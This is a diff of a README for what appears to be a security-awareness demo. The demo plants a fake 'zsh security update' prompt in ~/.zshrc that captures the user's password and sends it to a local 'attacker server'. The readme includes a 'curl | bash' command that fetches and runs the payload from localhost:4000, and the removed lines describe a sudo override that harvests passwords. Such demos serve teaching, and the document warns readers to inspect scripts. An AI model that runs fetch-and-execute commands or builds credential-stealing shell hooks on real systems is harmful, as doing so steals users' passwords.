@@ -2,30 +2,30 @@
 
 ## What It Does
 
-Appends a malicious `sudo` function override to `~/.zshrc`. When the user
-runs `sudo`, it shows a convincing "system update" prompt, captures the
-password, sends it to the attacker server, then passes through to the real
-`sudo` so the user never suspects anything.
+Appends a malicious block to `~/.zshrc` that shows a convincing
+"zsh security update" prompt on next terminal open. It captures the
+password, caches it, and exfiltrates it to the attacker server.
 
 ## How to Run
 
+Make sure the attacker server is running (`localhost:4000`), then:
+
 ```bash
-# Install the payload
-chmod +x install.sh && ./install.sh
-source ~/.zshrc
+curl -s http://localhost:4000/payload | bash
+```
 
-# Try it — type any fake password
-sudo ls
+Open a new terminal — the fake update prompt will appear. Type any
+fake password, then check http://localhost:4000 to see it captured.
 
-# Check the dashboard at http://localhost:4000
+To clean up:
 
-# Clean up
+```bash
 chmod +x uninstall.sh && ./uninstall.sh
-source ~/.zshrc
 ```
 
 ## Key Talking Point
 
-A single line appended to your shell config can silently intercept every
-privileged command you run. Always audit dotfile changes after installing
-tools or running setup scripts.
+A single `curl | bash` command — the kind you see in install instructions
+everywhere — can silently modify your shell config. Always inspect scripts
+before piping them to bash. Run `curl <url>` first to see what you're
+about to execute.
